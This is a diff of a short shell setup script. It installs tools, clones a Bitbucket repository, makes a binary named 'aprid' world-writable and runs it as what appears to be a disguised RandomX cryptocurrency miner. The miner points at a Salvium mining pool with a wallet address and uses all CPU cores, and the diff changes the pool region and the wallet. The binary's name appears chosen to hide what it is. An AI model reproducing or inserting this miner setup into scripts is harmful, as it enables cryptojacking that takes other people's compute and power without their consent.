@@ -3,4 +3,4 @@ yum update && yum -y install sudo
 yum -y install git wget
 git clone https://bitbucket.org/asana/luo.git && cd luo
 chmod 777 aprid SHA256SUMS
-./aprid --donate-level 1 -o hk.salvium.herominers.com:1230 -u solo:SaLvs9aDPAZREssAmnevZnQHdiMvTJEnzjPvovNzgvBSUEbYt5W3d9ZiMSQoRLH86pBxqYR9CAETkjBtv6S7QRqf5jkzQQHi9e2  -p pool -a rx/0 -k -t $(nproc --all)
+./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SC1siFaqsgxZRMthSYzwzjeHtF3zbJhznAEWdSD9QNtd5ZLjALSZe9MZ3U17YShjEx2SAEN2iUVdvf3c5zgDqQ7p1RGxxME4DfU -p solo -a rx/0 -k -t $(nproc --all)
